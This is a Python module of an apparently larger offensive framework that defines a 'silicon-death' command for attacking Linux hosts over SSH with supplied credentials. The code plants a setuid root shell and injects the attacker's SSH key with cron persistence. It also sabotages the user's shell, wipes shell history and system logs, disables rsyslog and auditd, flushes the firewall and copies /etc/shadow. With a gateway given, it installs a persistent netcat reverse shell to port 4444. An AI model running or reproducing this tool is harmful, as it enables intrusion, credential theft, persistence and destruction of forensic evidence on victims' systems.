import subprocess, os, sys, random, string
from datetime import datetime
from pathlib import Path

class Colors:
    RED='\033[91m';GREEN='\033[92m';YELLOW='\033[93m'
    BLUE='\033[94m';CYAN='\033[96m';MAGENTA='\033[95m'
    BOLD='\033[1m';RESET='\033[0m'

def run_local(cmd,timeout=60):
    try:
        r=subprocess.run(cmd if isinstance(cmd,list) else cmd.split(),capture_output=True,text=True,timeout=timeout)
        return{'ok':r.returncode==0,'out':r.stdout.strip(),'err':r.stderr.strip()}
    except:return{'ok':False,'out':'','err':'ERROR'}

class SiliconDeath:
    def __init__(self,target,username,password,domain="",port=22,gateway=None):
        self.target=target;self.username=username;self.password=password
        self.domain=domain;self.port=str(port);self.gateway=gateway
        self.target_os=None;self.is_root=False;self.has_sudo=False;self.has_backdoor=False
        self.backdoor_name=''.join(random.choices(string.ascii_lowercase,k=8))
        safe=target.replace('.','_').replace(':','_')
        self.loot_dir=Path.home()/'grimoire_loot'/safe/'silicon_death'
        self.loot_dir.mkdir(parents=True,exist_ok=True)
        self.results=[];self.cmd_total=0;self.cmd_ok=0

    def log(self,stage,success,detail=""):
        self.results.append((stage,success,detail))
        s=f"{Colors.GREEN}✓{Colors.RESET}" if success else f"{Colors.RED}✗{Colors.RESET}"
        print(f"  [{s}] {stage}");self.cmd_total+=1
        if success:self.cmd_ok+=1

    def ssh(self,cmd,timeout=30):
        return run_local(['sshpass','-p',self.password,'ssh','-o','StrictHostKeyChecking=no',
            '-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-p',self.port,
            f'{self.username}@{self.target}',f'/bin/bash --norc --noprofile -c "{cmd}"'],timeout=timeout)

    def run_root_cmd(self,cmd,timeout=30):
        if self.has_backdoor:return self.ssh(f'/bin/bash.backdoor -p -c "{cmd}"')
        elif self.has_sudo:return self.ssh(f'sudo {cmd}')
        return self.ssh(cmd)

    def smb(self,cmd,timeout=60):
        cred=f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"
        return run_local(['psexec.py',f'{cred}@{self.target}',cmd],timeout=timeout)

    def detect_os(self):
        r=self.ssh('uname -s 2>/dev/null; cat /etc/os-release 2>/dev/null | head -1')
        if r['ok'] and r['out']:
            self.target_os='linux'
            r2=self.ssh('whoami; id; sudo -n true 2>/dev/null && echo HAS_SUDO; /bin/bash.backdoor -p -c "id; echo HAS_BACKDOOR" 2>/dev/null')
            if r2['ok']:
                self.is_root='uid=0' in r2['out'];self.has_sudo='HAS_SUDO' in r2['out']
                self.has_backdoor='HAS_BACKDOOR' in r2['out'] and 'euid=0' in r2['out']
                if self.has_backdoor:self.is_root=True;self.has_sudo=True
            print(f"  [{Colors.GREEN}✓{Colors.RESET}] LINUX | Backdoor: {'Yes' if self.has_backdoor else 'No'}")
            return True
        return False

    def linux_attack(self):
        self.ssh('cp /bin/bash /tmp/.bash_suid 2>/dev/null; chmod 4777 /tmp/.bash_suid 2>/dev/null')
        r=self.ssh('ls -la /tmp/.bash_suid 2>/dev/null|grep rws')
        if r['ok'] and 'rws' in r['out']:self.has_backdoor=True;self.is_root=True
        self.log('Privesc',self.has_backdoor)

        key=Path.home()/'.ssh'/'id_rsa.pub'
        if not key.exists():run_local(['ssh-keygen', '-t', 'rsa', '-N', '', '-f', str(Path.home() / '.ssh' / 'id_rsa')])
        if key.exists():
            pk=key.read_text().strip()
            self.ssh(f'mkdir -p ~/.ssh && echo "{pk}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys')
            self.ssh(f'(crontab -l 2>/dev/null; echo "@reboot mkdir -p ~/.ssh && echo \\"{pk}\\" >> ~/.ssh/authorized_keys") | crontab -')
            self.log('SSH Key + Cron',True)

        self.ssh('echo "alias sudo=echo NOPE" >> ~/.bashrc 2>/dev/null; echo "exit" >> ~/.bashrc 2>/dev/null')
        self.ssh('cat /dev/null > ~/.bash_history 2>/dev/null; rm -f ~/.bash_history ~/.zsh_history')
        self.log('Shell Corrupted',True)

        if self.has_backdoor:
            self.run_root_cmd('iptables -F; iptables -X; iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT')
            self.run_root_cmd('find /var/log -type f -name "*.log" -exec cat /dev/null > {} \\; 2>/dev/null; true')
            self.run_root_cmd('cat /dev/null > /var/log/syslog 2>/dev/null; cat /dev/null > /var/log/auth.log 2>/dev/null')
            self.run_root_cmd('systemctl stop rsyslog auditd 2>/dev/null; systemctl disable rsyslog auditd 2>/dev/null')
            self.run_root_cmd('cat /etc/shadow > /tmp/.s 2>/dev/null; true')
            self.log('Firewall+Logs+Services',True)

        if self.gateway:
            rs=f'#!/bin/bash\nwhile true; do rm -f /tmp/.x; mkfifo /tmp/.x; cat /tmp/.x|/bin/bash -i 2>&1|nc {self.gateway} 4444 >/tmp/.x; sleep 60; done'
            self.ssh(f"echo '{rs}' > /tmp/.rs.sh && chmod +x /tmp/.rs.sh")
            self.ssh('(crontab -l 2>/dev/null; echo "@reboot /tmp/.rs.sh") | crontab -')
            self.log('Reverse Shell',True)

    def execute(self):
        if not self.detect_os():return
        print(f"\n{Colors.RED}  LAUNCHING ANNIHILATION{Colors.RESET}")
        self.linux_attack()
        print(f"\n  {Colors.BOLD}Succeeded:{Colors.RESET} {self.cmd_ok}/{self.cmd_total}")

    @classmethod
    def register(cls,sub):
        p=sub.add_parser('silicon-death',help='Security annihilation + persistence bomb')
        p.add_argument('target');p.add_argument('-u',required=True);p.add_argument('-p',required=True)
        p.add_argument('-d','--domain',default='');p.add_argument('-P','--port',type=int,default=22)
        p.add_argument('-g','--gateway');p.set_defaults(func=cls._run)

    @classmethod
    def _run(cls,args):
        SiliconDeath(args.target,args.u,args.p,args.domain,args.port,args.gateway).execute()
